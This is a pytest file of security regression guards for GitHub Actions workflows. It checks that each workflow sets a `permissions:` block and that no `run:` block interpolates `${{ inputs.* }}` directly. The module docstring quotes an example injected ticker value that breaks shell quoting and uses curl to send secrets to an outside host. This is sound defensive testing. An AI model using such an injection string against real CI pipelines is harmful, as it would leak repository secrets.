"""GitHub Actions workflow security regression guards.

Two contracts pinned after the 2026-05-28 security review:

  1. NO `${{ inputs.* }}` should appear inside `run:` blocks as direct
     shell interpolation. Pattern allows command-injection RCE — a
     crafted ticker like `aapl"; curl https://x/$SECRET #` would leak
     every secret in the step's `env:` block. All input passing must
     go through `env: { VAR: ${{ inputs.x }} }` then `"$VAR"` in shell.

  2. EVERY workflow must declare a top-level `permissions:` block.
     Without it, GITHUB_TOKEN inherits the repo default (read-write),
     so a compromised third-party action could push commits, modify
     webhooks, or create releases. These workflows only need read for
     checkout; `permissions: contents: read` is the minimum.
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest

WORKFLOW_DIR = Path(__file__).resolve().parents[3] / ".github" / "workflows"


def _workflow_files() -> list[Path]:
    if not WORKFLOW_DIR.exists():
        return []
    return sorted(WORKFLOW_DIR.glob("*.yml"))


def _run_block_ranges(src: str) -> list[tuple[int, int]]:
    """Yield (start, end) char-offset ranges that fall inside any
    `run:` block (multiline or single-line) so we can scan them.

    Detection: `run:` at the start of a YAML key line, followed by
    either `|` (multiline) or inline content. Multiline `run: |` blocks
    extend until the next line at the SAME OR LESS indentation as the
    `run:` key. Single-line `run: cmd` ends at the line break.
    """
    ranges: list[tuple[int, int]] = []
    lines = src.split("\n")
    offsets = [0]
    for ln in lines:
        offsets.append(offsets[-1] + len(ln) + 1)  # +1 for "\n"
    i = 0
    while i < len(lines):
        line = lines[i]
        m = re.match(r"^(\s*)run:\s*(\|.*)?$", line)
        if m:
            indent = len(m.group(1))
            is_multi = bool(m.group(2)) and m.group(2).strip().startswith("|")
            start = offsets[i]
            if is_multi:
                # consume lines indented strictly more than `indent`
                j = i + 1
                while j < len(lines):
                    nxt = lines[j]
                    if nxt.strip() == "":
                        j += 1
                        continue
                    nxt_indent = len(nxt) - len(nxt.lstrip())
                    if nxt_indent <= indent:
                        break
                    j += 1
                ranges.append((start, offsets[j]))
                i = j
                continue
            # single-line: just this line
            ranges.append((start, offsets[i + 1]))
        elif re.match(r"^(\s*)run:\s+\S", line):
            # `run: cmd` on the same line
            ranges.append((offsets[i], offsets[i + 1]))
        i += 1
    return ranges


def test_every_workflow_has_permissions_block() -> None:
    """Every workflow must lock down GITHUB_TOKEN via a top-level
    `permissions:` declaration. The minimum is `contents: read`."""
    files = _workflow_files()
    assert files, "no workflow files discovered — wrong path?"
    missing: list[str] = []
    for f in files:
        src = f.read_text(encoding="utf-8")
        # Allow either top-level or job-level. Top-level is preferred —
        # we accept either by simple string search since YAML structure
        # of these workflows is uniform.
        if not re.search(r"^\s*permissions:\s*$", src, re.MULTILINE):
            missing.append(f.name)
    assert not missing, (
        "workflows lacking permissions: block — GITHUB_TOKEN defaults to "
        f"repo read-write. Add `permissions: contents: read` to: {missing}"
    )


@pytest.mark.parametrize("workflow_path", _workflow_files(),
                         ids=lambda p: p.name)
def test_no_inputs_interpolation_in_run_blocks(workflow_path: Path) -> None:
    """`run:` blocks must NOT contain `${{ inputs.* }}` direct
    interpolation. Use env-indirection: `env: { VAR: ${{ inputs.x }} }`
    then `"$VAR"` in shell. Otherwise a crafted input can break the
    quoting and execute arbitrary commands with access to every secret
    in the same step's env."""
    src = workflow_path.read_text(encoding="utf-8")
    ranges = _run_block_ranges(src)
    offenders: list[str] = []
    for start, end in ranges:
        chunk = src[start:end]
        for m in re.finditer(r"\$\{\{\s*inputs\.[A-Za-z_]\w*\s*\}\}", chunk):
            # snippet for the error message
            line_no = src[:start + m.start()].count("\n") + 1
            offenders.append(f"L{line_no}: {m.group(0)}")
    assert not offenders, (
        f"{workflow_path.name} interpolates inputs into shell — RCE risk. "
        f"Pass via env: block instead. Offending lines: {offenders}"
    )
